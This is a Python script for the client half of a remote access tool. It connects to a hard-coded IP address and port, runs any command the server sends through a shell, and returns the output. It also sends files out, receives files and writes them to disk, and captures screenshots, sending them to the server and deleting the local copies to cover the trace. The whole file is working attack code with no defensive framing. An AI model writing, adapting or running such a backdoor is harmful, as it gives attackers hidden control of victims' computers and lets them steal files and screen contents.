#!/usr/bin/python3

# import modules
import socket
import subprocess
import os
from PIL import ImageGrab


# take a screenshot
def screenshot():
    shot = ImageGrab.grab()
    shot.save(f'screenshot.png')
    shot.close()


# upload a file to client's machine
def upload(file):
    f = open(file, 'rb')
    client.send(f.read())


def download(file):
    f = open(file, 'wb')
    client.settimeout(5)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()


# define remote host and port
host = '172.22.254.158'
port = 8080

# create socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))

# receive and decode commands from the server
while True:
    comm = client.recv(1024).decode()
    if not comm:
        break
    elif comm == '':
        pass
    elif comm[:2] == 'cd':
        os.system(comm)
    elif comm[:2] == 'up':
        download(comm[3:])
    elif comm[:3] == 'get':
        try:
            upload(comm[4:])
        except PermissionError as e:
            warn = f'\nError: {e}\n'
            client.send(warn.encode())
    elif comm[:5] == 'start':
        os.system(comm)
    elif comm[:4] == 'echo':
        os.system(comm)
    elif comm[:5] == 'touch':
        os.system(comm)
    elif comm[:4] == 'open':
        os.system(comm)
    elif comm == 'screenshot':
        # take the screenshot
        screenshot()

        # send to the server
        upload('screenshot.png')

        # delete from the client's machine
        os.remove('screenshot.png')
    else:
        try:
            # excute command sending the output
            output = subprocess.check_output(comm, stderr=subprocess.STDOUT, text=True, shell=True)
            client.send(output.encode())
        except subprocess.CalledProcessError as e:
            error_msg = f'Error excuting command: {comm}\n{e}'
            client.send(error_msg.encode())
        except (ValueError, TypeError) as e:
            error_msg = f'\nError: {e}'
            client.send(error_msg.encode())

# close the connection.
client.close()
